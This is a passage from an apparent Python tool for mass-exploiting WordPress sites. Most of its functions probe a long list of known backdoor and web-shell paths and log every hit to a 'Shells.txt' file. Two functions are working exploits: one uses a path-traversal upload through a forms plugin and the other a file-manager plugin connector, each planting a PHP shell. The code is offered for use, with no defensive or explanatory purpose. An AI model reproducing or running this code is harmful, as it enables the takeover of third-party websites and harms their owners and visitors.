            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X68(url):
    try:
        upload_dir = url +"/wp-includes/class-index-wordpress.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X69(url):
    try:
        upload_dir = url +"/wp-admin/js/widgets/wp-login.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X70(url):
    try:
        upload_dir = url +"/wp-includes/class-wordpress-license.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X71(url):
    try:
        upload_dir = url +"/wp-includes/class-wp-page-icon.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X72(url):
    try:
        upload_dir = url +"/wp-includes/wp-system-cloud.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X73(url):
    try:
        upload_dir = url +"/wp-content/plugins/css-ready-sel/file.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X74(url):
    try:
        upload_dir = url +"/wp-includes/css/modules.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X75(url):
    try:
        upload_dir = url +"/wp-admin/shapes.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X76(url):
    try:
        upload_dir = url +"/wp-content/plugins/wp-db-ajax-made/wp-ajax.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X77(url):
    try:
        upload_dir = url +"/wp-content/plugins/xichang/x.php?xi"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X78(url):
    try:
        upload_dir = url +"/wp-content/plugins/three-column-screen-layout/db.php?u"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if '#0x2525' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X79(url):
    try:
        upload_dir = url +"/wp-content/themes/gaukingo/db.php?u"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if '#0x2525' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X80(url):
    try:
        upload_dir = url +"/wp-content/plugins/vwcleanerplugin/bump.php?cache"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X81(url):
    try:
        upload_dir = url +"/wp-content/plugins/ubh/index.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X82(url):
    try:
        upload_dir = url +"/wp-content/plugins/upspy/index.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X83(url):
    try:
        appgrav  = {'field_id':'3',
		'form_id':'1',
		'gform_unique_id':'../../../../',
		'name':'TitaniumEx.php'}
        upload_dir = url +"/wp-content/_input_3_TitaniumEx.php?Titanium=Ex"
        postdir = url+"/?gf_page=upload"
        xex = requests.post(postdir,data=appgrav,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X84(url):
    try:
        filenamexx = "TitaniumEx.php"
        data = {'cmd': 'upload', 'target': 'l1_Lw'}
        fileup = {'upload[]': (filenamexx, shell, 'multipart/form-data')}
        upload_dir = url +"wp-content/plugins/wp-file-manager/lib/files/TitaniumEx.php?Titanium=Ex"
        postdir = url+"/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
        xex = requests.post(postdir,data=data,files=fileup,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X85(url):
    try:
        upload_dir = url +"/wp-content/plugins/upload/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X86(url):
    try:
        upload_dir = url +"/wp-content/themes/twentyfive/include.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X87(url):
    try:
        upload_dir = url +"/wp-includes/SimplePie/IRI-stream.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X88(url):
    try:
        upload_dir = url +"/wp-content/plugins/aryabot/mari.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X89(url):
    try:
        upload_dir = url +"/wp-content/plugins/upload/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X90(url):
    try:
        upload_dir = url +"/wp-content/plugins/simple-google-recaptcha/recaptcha.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X91(url):
    try:
        upload_dir = url +"/wp-content/themes/astra/mar.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X92(url):
    try:
        upload_dir = url +"/wp-includes/theme-compat/wp-aespa.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X93(url):
    try:
        upload_dir = url +"/wp-content/themes/mTheme-Unus/css/css.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X94(url):
    try:
        upload_dir = url +"/wp-content/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
